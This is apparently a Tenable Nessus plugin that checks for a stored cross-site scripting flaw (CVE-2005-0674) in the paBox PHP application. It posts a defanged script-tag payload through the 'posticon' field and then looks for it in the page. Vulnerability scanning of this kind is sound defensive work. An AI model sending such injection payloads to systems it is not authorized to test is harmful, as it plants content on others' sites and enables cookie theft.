#
# (C) Tenable Network Security
#


if (description) {
  script_id(17336);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-0674");
  script_bugtraq_id(12796);

  name["english"] = "paBox Post Icon HTML Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to a cross-
site scripting attack. 

Description :

The remote host is running paBox, a web application written in PHP. 

The remote version of paBox installed on the remote host does not
properly sanitize input supplied through the 'date' and 'time'
parameters of the smileys selection.  By exploiting this flaw, an
attacker could inject HTML and script code into the browser of users
who use the installation, potentially stealing authentication cookies
and controlling how the affected application is rendered. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2005-03/0063.html

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:H/Au:NR/C:N/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for post icon HTML injection vulnerability in paBox";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  family["english"] = "CGI abuses : XSS";
  script_family(english:family["english"]);

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("cross_site_scripting.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# The exploit.
#
# nb: "alurt" rather than "alert" to not wreck havoc.
xss = '<script>alurt("Nessus");</script>';
# and the url-encoded version.
exss = "%22%3E%3Cscript%3Ealurt(%22Nessus%22)%3B%3C%2Fscript%3E";
foreach dir (cgi_dirs()) {
  # Try the exploit.
  postdata = string(
    "name=nasl&",
    "site=&",
    "shout=A%20test&",
    "posticon=", exss, "&",
    "submit=Shout!"
  );
  req = string(
    "POST ",  dir, "/pabox.php?action=add HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Content-Type: application/x-www-form-urlencoded\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # After posting, the page must be retrieved to see the results.
  if ('<META HTTP-EQUIV="Refresh"' >< res) {
    req = http_get(item:string(dir, "/pabox.php"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If we see our XSS, there's a problem.
    if (xss >< res) {
      security_note(port);
      exit(0);
    }
  }
}
